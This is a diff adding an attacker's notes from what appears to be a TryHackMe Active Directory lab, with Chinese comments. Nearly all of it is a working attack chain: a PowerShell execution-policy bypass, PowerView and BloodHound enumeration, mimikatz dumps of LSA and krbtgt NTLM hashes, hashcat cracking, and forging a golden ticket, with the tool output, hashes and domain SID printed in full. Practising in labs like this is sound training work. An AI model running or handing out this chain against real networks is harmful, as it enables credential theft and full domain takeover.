@@ -1,0 +1,56 @@
+rdesktop -a 16 -z -u Administrator  -p 'P@$$W0rd' CONTROLLER
+powershell -ep bypass
+ . .\PowerView.ps1
+Get-NetUser |select cn
+Get-NetGroup -GroupName *admin*
+Invoke-ShareFinder
+
+. .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -Domain Controller.local -ZipFilename loot.zip
+
+
+scp  administrator@10.10.47.4:/users/Administrator/Downloads/20210517063503_loot.zip ./loot.zip
+
+mimikatz將 NTLM hash 導出
+###mimikatz.exe
+ lsadump::lsa /patch
+
+hashcat -m 1000  hash /home/kali/timmy/TryHackMe/AttacktiveDirect/password.txt
+
+mimikatz 導出kerberoas ticket granting ticket
+ lsadump::lsa /inject /name:krbtgt
+####################################################################
+ Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166
+
+RID  : 000001f6 (502)
+User : krbtgt
+
+ * Primary
+    NTLM : 5508500012cc005cf7082a9a89ebdfdf
+    LM   :
+  Hash NTLM: 5508500012cc005cf7082a9a89ebdfdf
+    ntlm- 0: 5508500012cc005cf7082a9a89ebdfdf
+    lm  - 0: 372f405db05d3cafd27f8e6a4a097b2c
+#####################################################################
+###生成golden ticket
+mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
+User      : Administrator
+Domain    : controller.local (CONTROLLER)
+SID       : S-1-5-21-849420856-2351964222-986696166
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 5508500012cc005cf7082a9a89ebdfdf - rc4_hmac_nt
+Lifetime  : 5/18/2021 5:31:59 AM ; 5/16/2031 5:31:59 AM ; 5/16/2031 5:31:59 AM
+-> Ticket : ticket.kirbi
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Final Ticket Saved to file !
+
+
+mimikatz # misc::cmd
+Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF7967343B8
